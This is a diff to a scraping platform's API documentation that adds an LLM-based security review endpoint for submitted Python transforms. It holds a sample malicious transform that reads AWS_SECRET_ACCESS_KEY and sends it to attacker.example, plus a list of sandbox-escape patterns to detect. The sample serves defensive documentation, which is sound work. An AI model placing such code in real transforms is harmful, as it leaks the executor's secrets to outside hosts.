@@ -390,8 +390,9 @@ The relevant skills:
 | Skill | Endpoint | Input | Output |
 | --- | --- | --- | --- |
 | Stages from intent | `POST /webrobot/api/demo/wizard/suggest` | `{"intent":"..."}` | `{"suggested":["wget","wgetExplore",...]}` |
-| Python transform from intent | `POST /webrobot/api/demo/wizard/generate-python-transform` | `{"intent":"...","sampleRow":{...}}` (sampleRow optional) | `{"name":"clean_price","code":"def clean_price(row): ..."}` |
-| Validate a Python transform | `POST /webrobot/api/demo/wizard/validate-python-transform` | `{"code":"def ..."}` | `{"ok":true,"name":"clean_price"}` or `{"ok":false,"issues":[...]}` |
+| Python transform from intent | `POST /webrobot/api/demo/wizard/generate-python-transform` | `{"intent":"...","sampleRow":{...}}` (sampleRow optional) | `{"name":"clean_price","code":"...","valid":true,"security":{"safe":true,"severity":"none"}}` |
+| Validate a Python transform (contract) | `POST /webrobot/api/demo/wizard/validate-python-transform` | `{"code":"def ..."}` | `{"ok":true,"name":"clean_price"}` or `{"ok":false,"issues":[...]}` |
+| Security-check a Python transform (LLM) | `POST /webrobot/api/demo/wizard/security-check-python-transform` | `{"code":"def ..."}` | `{"safe":bool,"severity":"none\|low\|medium\|high\|critical","risks":[...],"summary":"..."}` |
 
 The benefit of named skills over raw LLM calls: every client (CLI, demo UI, your own integration) hits the same system prompt and the same output shape — drift between callers is impossible, and the platform owners can iterate the prompt without breaking every consumer.
 
@@ -423,6 +424,56 @@ Drop the returned `code` straight into a `python_define` stage:
 This is also the natural shape for an "intent box" widget next to the YAML editor in the demo UI: a textarea, a "generate" button, and the same endpoint. No system prompt in the client, no divergence.
 
 The three paths converge on the same YAML, so you can mix freely — e.g. let the platform generate the scraping stages (path 1), refine the transform via the named skill (path 3), and polish edge cases by hand in the IDE (path 2). The contract that backs them all is one place: the wizard skills on the server.
+
+### Security review of submitted Python
+
+Hand-written code (path 2) and code copied off the internet need a second pair of eyes. The platform exposes an **LLM-based security review** that complements the static contract check — same shape, different question:
+
+| Check | What it looks for | When it runs |
+| --- | --- | --- |
+| `validate-python-transform` | Contract: one top-level `def NAME(row):`, no top-level imports, no obvious I/O, returns something | Static, deterministic, fast |
+| `security-check-python-transform` | Sandbox-escape patterns: `os.environ`, `__import__`, reflection via `__class__.__bases__`, hidden `subprocess`/`socket`/`eval`, base64-decoded payloads, etc. | LLM-based, slower (~1–2 s), catches what regex can't |
+
+Recommended flow before saving a pipeline with custom Python:
+
+```bash
+# 1. static contract
+curl -s -X POST https://api.webrobot.eu/webrobot/api/demo/wizard/validate-python-transform \
+  -H 'Content-Type: application/json' \
+  -d "$(jq -n --arg c "$CODE" '{code:$c}')" | jq .
+
+# 2. LLM security review — fail closed on `safe:false`
+curl -s -X POST https://api.webrobot.eu/webrobot/api/demo/wizard/security-check-python-transform \
+  -H 'Content-Type: application/json' \
+  -d "$(jq -n --arg c "$CODE" '{code:$c}')" | jq .
+```
+
+A malicious snippet that tries to exfiltrate env vars:
+
+```python
+def clean_price(row):
+    import os, urllib.request
+    # exfiltrate the executor's secrets to attacker-controlled host
+    urllib.request.urlopen('https://attacker.example/' + os.environ.get('AWS_SECRET_ACCESS_KEY', ''))
+    return {**row, 'price': 0.0}
+```
+
+→ response:
+```json
+{
+  "safe": false,
+  "severity": "critical",
+  "risks": [
+    {"category": "env-exfiltration", "explanation": "Reads AWS_SECRET_ACCESS_KEY from os.environ", "snippet": "os.environ.get('AWS_SECRET_ACCESS_KEY', '')"},
+    {"category": "network",          "explanation": "urllib.request.urlopen to attacker-controlled host", "snippet": "urllib.request.urlopen('https://attacker.example/...')"}
+  ],
+  "summary": "Reads AWS secret from env and POSTs it to an external host."
+}
+```
+
+The `generate-python-transform` endpoint runs this check automatically on its own output — the response includes a `security` field alongside `code` and `valid`. For code that didn't come from the generator (path 2 in the IDE), call the security endpoint explicitly before `save-generated-pipeline`.
+
+**Defense in depth, not the only line.** The executor itself is still the authoritative sandbox — stdlib-only, no globals, isolated namespace. The LLM review just keeps obviously hostile code out of the queue before Spark is even scheduled, which protects the shared demo cluster and keeps the audit trail clean.
 
 ### When to use which mode
 
